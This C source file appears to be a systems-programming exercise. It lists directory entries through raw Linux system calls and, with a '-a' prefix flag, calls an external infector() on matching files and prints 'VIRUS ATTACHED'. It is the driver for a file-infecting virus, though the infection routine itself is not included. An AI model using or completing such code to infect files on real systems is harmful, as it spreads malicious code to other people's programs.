#include "util.h"

#define SYS_GETDENTS 141
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_WRITE 4
#define SYS_EXIT 1
#define STDOUT 1
#define O_RDONLY 0
#define BUF_SIZE 8192
#define DT_REG 8

extern void infection();
extern void infector(char*);

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

extern int system_call();

int main(int argc, char *argv[]) {
    char buf[BUF_SIZE];
    int fd, nread, bpos;
    struct linux_dirent *d;
    int attach_mode = 0;
    char prefix[3] = {0, 0, 0};
    char *arg;
    unsigned char d_type;
    int i;
    
    /* Check for -a flag */
    if (argc > 1) {
        arg = argv[1];
        if (arg[0] == '-' && arg[1] == 'a') {
            attach_mode = 1;
            /* Copy prefix - handle variable length */
            i = 2;
            while (arg[i] != '\0' && i < 4) {
                prefix[i-2] = arg[i];
                i++;
            }
        }
    }
    
    /* Open current directory */
    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_EXIT, 0x55);
    }
    
    /* Get directory entries */
    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_CLOSE, fd);
        system_call(SYS_EXIT, 0x55);
    }
    
    system_call(SYS_CLOSE, fd);
    
    /* Process each entry */
    bpos = 0;
    while (bpos < nread) {
        d = (struct linux_dirent *)(buf + bpos);
        d_type = *((char*)d + d->d_reclen - 1);
        
        /* Skip . and .. */
        if (d->d_name[0] != '.') {
            int matches = 0;
            int prefix_len = 0;
            
            /* Calculate prefix length */
            while (prefix[prefix_len] != '\0' && prefix_len < 2) {
                prefix_len++;
            }
            
            if (attach_mode && prefix_len > 0) {
                /* Check prefix match */
                matches = 1;
                for (i = 0; i < prefix_len; i++) {
                    if (d->d_name[i] != prefix[i]) {
                        matches = 0;
                        break;
                    }
                }
            }
            
            /* Print filename */
            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            
            if (attach_mode && matches) {
                /* Attach virus and print message */
                infector(d->d_name);
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
            }
            
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        
        bpos += d->d_reclen;
    }
    
    return 0;
}